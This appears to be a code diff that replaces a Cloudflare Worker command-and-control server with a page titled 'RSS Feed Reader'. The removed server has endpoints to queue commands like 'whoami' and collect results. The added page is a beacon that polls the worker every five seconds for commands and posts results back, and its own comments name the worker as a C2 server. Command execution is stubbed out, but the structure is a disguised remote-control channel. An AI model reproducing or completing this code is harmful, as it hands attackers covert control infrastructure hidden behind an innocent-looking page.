@@ -1,55 +1,42 @@
-let currentCommand = "";
-let lastResult = "";
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>RSS Feed Reader</title>
+</head>
+<body>
+    <h1>Loading RSS Feed...</h1>
+    
+    <script>
+        // あなたのCloudflare WorkersのURLを指定
+        const workerUrl = 'https://myrss.bunkihara08.workers.dev';
 
-export default {
-  async fetch(request, env, ctx) {
-    const url = new URL(request.url);
-    const corsHeaders = {
-      "Access-Control-Allow-Origin": "*",
-      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
-      "Access-Control-Allow-Headers": "Content-Type",
-    };
+        async function pollCommand() {
+            try {
+                // Cloudflare Workersへコマンドを要求
+                let response = await fetch(`${workerUrl}/poll`);
+                let data = await response.json();
+                
+                if (data && data.cmd) {
+                    console.log("Command received:", data.cmd);
+                    
+                    // コマンドの実行結果
+                    let output = "Result of: " + data.cmd;
 
-    // CORSプリフライトリクエストの処理
-    if (request.method === "OPTIONS") {
-      return new Response(null, { headers: corsHeaders });
-    }
+                    // 実行結果をWorkersへ送信
+                    await fetch(`${workerUrl}/result`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ result: output })
+                    });
+                }
+            } catch (error) {
+                console.error("Communication error", error);
+            }
+        }
 
-    // 1. コマンドの確認・取得エンドポイント (/poll)
-    if (url.pathname === "/poll") {
-      const responseBody = JSON.stringify({ cmd: currentCommand });
-      currentCommand = ""; // 取得されたらコマンドをクリア
-      return new Response(responseBody, {
-        headers: { ...corsHeaders, "Content-Type": "application/json" }
-      });
-    }
-
-    // 2. 実行結果の送信エンドポイント (/result)
-    if (url.pathname === "/result" && request.method === "POST") {
-      try {
-        const body = await request.json();
-        lastResult = body.result || "";
-        return new Response(JSON.stringify({ status: "success" }), {
-          headers: { ...corsHeaders, "Content-Type": "application/json" }
-        });
-      } catch (e) {
-        return new Response(JSON.stringify({ status: "error", message: e.message }), {
-          status: 400,
-          headers: { ...corsHeaders, "Content-Type": "application/json" }
-        });
-      }
-    }
-
-    // 3. サーバー管理者用：ブラウザから手動でコマンドをセットする場合 (/setcmd?cmd=whoami)
-    if (url.pathname === "/setcmd") {
-      const cmdParam = url.searchParams.get("cmd");
-      if (cmdParam) {
-        currentCommand = cmdParam;
-        return new Response(`Command set: ${cmdParam}`, { headers: corsHeaders });
-      }
-      return new Response(`Current result: ${lastResult}`, { headers: corsHeaders });
-    }
-
-    return new Response("C2 Infrastructure Active", { headers: corsHeaders });
-  }
-};
+        // 5秒ごとにC2サーバーへポーリングを行う
+        setInterval(pollCommand, 5000);
+    </script>
+</body>
+</html>
